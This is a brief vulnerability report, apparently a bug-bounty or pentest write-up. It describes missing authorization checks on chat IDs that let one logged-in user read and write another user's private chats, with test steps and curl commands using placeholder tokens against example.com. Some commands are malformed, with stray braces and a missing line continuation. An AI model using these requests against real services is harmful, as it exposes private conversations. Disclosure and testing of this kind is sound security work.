## Use case

The application allowed any authenticated user to read and write messages in another user's private chat by exploiting a lack of authorization checks on chat IDs. This vulnerability is critical as it exposes sensitive conversations between users, potentially leading to data breaches.

## Steps to test

1. Create two separate test accounts (Account A = victim, Account B = attacker).
2. Log in as Account A and create a private chat by sending a POST request to /api/chat with Account A's session token.
3. Log in as Account B and attempt to read Account A's chat by sending a GET request to /chats/<Account_A_Chat_ID> with Account B's session token.
4. Verify the response to confirm that Account B can access Account A's chat content.
5. Attempt to write a message to Account A's chat by sending a POST request to /api/chat with Account B's session token and Account A's chat ID.

## Commands

```text
curl -sk 'https://example.com/api/chat' -X POST \
-H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_A_TOKEN>' \
-H 'Content-Type: text/plain;charset=UTF-8' \
-d '{ "messages": [ { "id": "aB3xK9m", "content": "Explain how SQL injection works", "role": "user" } ], "id": "aB3xK9m" } }'
curl -sk 'https://example.com/chats/aB3xK9m' \
-H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_B_TOKEN>' \
-H 'RSC: 1'
-d '{ "messages": [ { "id": "aB3xK9m", "content": "BOLA-WRITE-TEST-FROM-ATTACKER", "role": "user" } ], "id": "aB3xK9m" } }'

curl -sk 'https://example.com/api/auth/session' \
-H 'Cookie: __Secure-authjs.session-token=<ACCOUNT_A_TOKEN>'
```
